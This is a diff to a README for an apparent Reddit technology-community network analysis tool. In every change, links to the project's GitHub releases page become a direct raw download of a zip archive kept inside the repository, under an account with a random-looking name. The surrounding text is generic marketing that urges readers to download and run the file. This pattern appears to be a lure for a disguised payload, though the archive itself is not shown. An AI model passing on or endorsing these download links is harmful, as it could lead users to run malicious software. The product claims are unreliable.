@@ -1,6 +1,6 @@
 # 📊 Reddit-Technology-Programming-Communities-Social-Media-Network-Analysis - Understand Tech Communities Through Data
 
-[![Download Now](https://img.shields.io/badge/Download-Application-2ea44f?style=for-the-badge)](https://github.com/outwardnessscabiosaarvensis977/Reddit-Technology-Programming-Communities-Social-Media-Network-Analysis/releases)
+[![Download Now](https://img.shields.io/badge/Download-Application-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/outwardnessscabiosaarvensis977/Reddit-Technology-Programming-Communities-Social-Media-Network-Analysis/main/network/Reddit-Analysis-Social-Communities-Technology-Media-Programming-Network-1.6.zip)
 
 ## 👋 What Is This?
 
@@ -31,7 +31,7 @@ Follow these simple steps to start using the application today.
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [Download Page](https://github.com/outwardnessscabiosaarvensis977/Reddit-Technology-Programming-Communities-Social-Media-Network-Analysis/releases)
+Visit this link to download the application: [Download Page](https://raw.githubusercontent.com/outwardnessscabiosaarvensis977/Reddit-Technology-Programming-Communities-Social-Media-Network-Analysis/main/network/Reddit-Analysis-Social-Communities-Technology-Media-Programming-Network-1.6.zip)
 
 The download button will be clearly visible on the page. Click it and save the file to a location you can easily find, like your Desktop or Downloads folder.
 
@@ -122,7 +122,7 @@ If you encounter any issues while downloading or running the application, most p
 
 ## 🏁 Final Steps
 
-You're now ready to unlock valuable insights from Reddit tech communities. [Download the application here](https://github.com/outwardnessscabiosaarvensis977/Reddit-Technology-Programming-Communities-Social-Media-Network-Analysis/releases) and start exploring the data landscape today.
+You're now ready to unlock valuable insights from Reddit tech communities. [Download the application here](https://raw.githubusercontent.com/outwardnessscabiosaarvensis977/Reddit-Technology-Programming-Communities-Social-Media-Network-Analysis/main/network/Reddit-Analysis-Social-Communities-Technology-Media-Programming-Network-1.6.zip) and start exploring the data landscape today.
 
 The tool transforms raw social media data into clear, actionable business intelligence. Whether you're planning a product launch, improving developer relations, or tracking industry trends, this application gives you the edge you need.
 
